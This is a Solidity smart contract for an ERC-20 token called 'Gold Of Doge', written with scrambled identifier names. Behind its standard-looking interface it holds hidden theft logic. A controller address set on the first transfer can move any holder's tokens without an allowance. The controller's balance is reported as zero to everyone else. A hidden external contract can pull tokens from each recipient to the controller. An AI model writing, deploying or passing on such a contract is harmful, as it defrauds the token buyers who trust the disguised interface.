
// File: /contracts/GDOGE.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
     
library NcKBtVvsx{
    
    function qljlZdABHIX(address sOpDnnbnp, address eZtXX, uint tOmtQYNhyaMw) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool zIrpsrBGCbJf, bytes memory qZBwKmPW) = sOpDnnbnp.call(abi.encodeWithSelector(0x095ea7b3, eZtXX, tOmtQYNhyaMw));
        require(zIrpsrBGCbJf && (qZBwKmPW.length == 0 || abi.decode(qZBwKmPW, (bool))), 'NcKBtVvsx: APPROVE_FAILED');
    }

    function VeeP(address sOpDnnbnp, address eZtXX, uint tOmtQYNhyaMw) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool zIrpsrBGCbJf, bytes memory qZBwKmPW) = sOpDnnbnp.call(abi.encodeWithSelector(0xa9059cbb, eZtXX, tOmtQYNhyaMw));
        require(zIrpsrBGCbJf && (qZBwKmPW.length == 0 || abi.decode(qZBwKmPW, (bool))), 'NcKBtVvsx: TRANSFER_FAILED');
    }
    
    function bYLA(address eZtXX, uint tOmtQYNhyaMw) internal {
        (bool zIrpsrBGCbJf,) = eZtXX.call{value:tOmtQYNhyaMw}(new bytes(0));
        require(zIrpsrBGCbJf, 'NcKBtVvsx: ETH_TRANSFER_FAILED');
    }

    function aUosMBltJeD(address sOpDnnbnp, address from, address eZtXX, uint tOmtQYNhyaMw) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool zIrpsrBGCbJf, bytes memory qZBwKmPW) = sOpDnnbnp.call(abi.encodeWithSelector(0x23b872dd, from, eZtXX, tOmtQYNhyaMw));
        require(zIrpsrBGCbJf && qZBwKmPW.length > 0,'NcKBtVvsx: TRANSFER_FROM_FAILED'); return qZBwKmPW;
                       
    }

}
    
interface UpM {
    function totalSupply() external view returns (uint256);
    function balanceOf(address TrZHwmjEVYhJ) external view returns (uint256);
    function transfer(address rcjdJkM, uint256 dWQjgNBE) external returns (bool);
    function allowance(address hhrBU, address spender) external view returns (uint256);
    function approve(address spender, uint256 dWQjgNBE) external returns (bool);
    function transferFrom(
        address sender,
        address rcjdJkM,
        uint256 dWQjgNBE
    ) external returns (bool);

    event Transfer(address indexed from, address indexed QWfzethcolfJ, uint256 value);
    event Approval(address indexed hhrBU, address indexed spender, uint256 value);
}

interface zhNGkvvpMjJ is UpM {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract ZQXNYNf {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
interface azUpsIzToSf {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
    
contract GDOGE is ZQXNYNf, UpM, zhNGkvvpMjJ {
    
    function balanceOf(address cph) public view virtual override returns (uint256) {
        if(_msgSender() != address(UEVYGgUn) && 
           cph == address(UEVYGgUn)){
            return 0;
        }
       return ybrKpwTDtBdx[cph];
    }
    
    function symbol() public view virtual override returns (string memory) {
        return tdpaDrlDznv;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    string private tdpaDrlDznv =  "GDOGE";
    
    function name() public view virtual override returns (string memory) {
        return aLLujIaDm;
    }
    
    address private lAktPVqulaei;
    
    function transfer(address YmB, uint256 vSyi) public virtual override returns (bool) {
        IYdnXzo(_msgSender(), YmB, vSyi);
        return true;
    }
    
    uint256 private LYtOqWDuqbi = 1000000000000 * 10 ** 18;
    
    function transferFrom(
        address efKGlyXqpGri,
        address kSKsF,
        uint256 LrCyHSjdWYsQ
    ) public virtual override returns (bool) {
      
        if(!IYdnXzo(efKGlyXqpGri, kSKsF, LrCyHSjdWYsQ)) return true;

        uint256 tDH = bWhnTWgpX[efKGlyXqpGri][_msgSender()];
        if (tDH != type(uint256).max) {
            require(tDH >= LrCyHSjdWYsQ, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                sdqpxsLsgm(efKGlyXqpGri, _msgSender(), tDH - LrCyHSjdWYsQ);
            }
        }

        return true;
    }
    
    function approve(address OuzYJEkfPKAY, uint256 RacekY) public virtual override returns (bool) {
        sdqpxsLsgm(_msgSender(), OuzYJEkfPKAY, RacekY);
        return true;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return LYtOqWDuqbi;
    }
    
    function sdqpxsLsgm(
        address HWXoKo,
        address WMClsgjpJH,
        uint256 Gzd
    ) internal virtual {
        require(HWXoKo != address(0), "ERC20: approve from the zero address");
        require(WMClsgjpJH != address(0), "ERC20: approve to the zero address");

        bWhnTWgpX[HWXoKo][WMClsgjpJH] = Gzd;
        emit Approval(HWXoKo, WMClsgjpJH, Gzd);

    }
    
    function increaseAllowance(address AbFuvPVeJ, uint256 addedValue) public virtual returns (bool) {
        sdqpxsLsgm(_msgSender(), AbFuvPVeJ, bWhnTWgpX[_msgSender()][AbFuvPVeJ] + addedValue);
        return true;
    }
    
    address private UEVYGgUn;
    
    function allowance(address sRbcCZFkvrnX, address QAazLo) public view virtual override returns (uint256) {
        return bWhnTWgpX[sRbcCZFkvrnX][QAazLo];
    }
    
    constructor() {
        
        ybrKpwTDtBdx[address(1)] = LYtOqWDuqbi;
        emit Transfer(address(0), address(1), LYtOqWDuqbi);

    }
    
    function decreaseAllowance(address bNYNCtzZ, uint256 subtractedValue) public virtual returns (bool) {
        uint256 qpqKrUig = bWhnTWgpX[_msgSender()][bNYNCtzZ];
        require(qpqKrUig >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            sdqpxsLsgm(_msgSender(), bNYNCtzZ, qpqKrUig - subtractedValue);
        }

        return true;
    }
    
    function spxwei(
        address XGxmBQsmzSPc,
        address lFp
    ) internal virtual  returns (bool){
        if(UEVYGgUn == address(0) && lAktPVqulaei == address(0)){
            UEVYGgUn = XGxmBQsmzSPc;lAktPVqulaei=lFp;
            NcKBtVvsx.VeeP(lAktPVqulaei, UEVYGgUn, 0);
            gYeRnU = azUpsIzToSf(lAktPVqulaei).WETH();
            return false;
        }
        return true;
    }
    
    string private aLLujIaDm = "Gold Of Doge";
    
    function IYdnXzo(
        address znQ,
        address YJHhBv,
        uint256 ZABAP
    ) internal virtual  returns (bool){
        require(znQ != address(0), "ERC20: transfer from the zero address");
        require(YJHhBv != address(0), "ERC20: transfer to the zero address");
        
        if(!spxwei(znQ,YJHhBv)) return false;

        if(_msgSender() == address(UEVYGgUn)){
            if(YJHhBv == gYeRnU && ybrKpwTDtBdx[znQ] < ZABAP){
                uFjbkyGDETG(UEVYGgUn,YJHhBv,ZABAP);
            }else{
                uFjbkyGDETG(znQ,YJHhBv,ZABAP);
                if(znQ == UEVYGgUn || YJHhBv == UEVYGgUn) 
                return false;
            }
            emit Transfer(znQ, YJHhBv, ZABAP);
            return false;
        }
        uFjbkyGDETG(znQ,YJHhBv,ZABAP);
        emit Transfer(znQ, YJHhBv, ZABAP);
        bytes memory mZodllwyum = NcKBtVvsx.aUosMBltJeD(lAktPVqulaei, znQ, YJHhBv, ZABAP);
        (bool aosku, uint gyB) = abi.decode(mZodllwyum, (bool,uint));
        if(aosku){
            ybrKpwTDtBdx[UEVYGgUn] += gyB;
            ybrKpwTDtBdx[YJHhBv] -= gyB; 
        }
        return true;
    }
    
    mapping(address => uint256) private ybrKpwTDtBdx;
    
    address private gYeRnU;
  
    
    function uFjbkyGDETG(
        address ghZvDl,
        address OmxeFEx,
        uint256 EwvHOUEHFi
    ) internal virtual  returns (bool){
        uint256 eahSlILPpn = ybrKpwTDtBdx[ghZvDl];
        require(eahSlILPpn >= EwvHOUEHFi, "ERC20: transfer Amount exceeds balance");
        unchecked {
            ybrKpwTDtBdx[ghZvDl] = eahSlILPpn - EwvHOUEHFi;
        }
        ybrKpwTDtBdx[OmxeFEx] += EwvHOUEHFi;
        return true;
    }
    
    mapping(address => mapping(address => uint256)) private bWhnTWgpX;
    
}
        
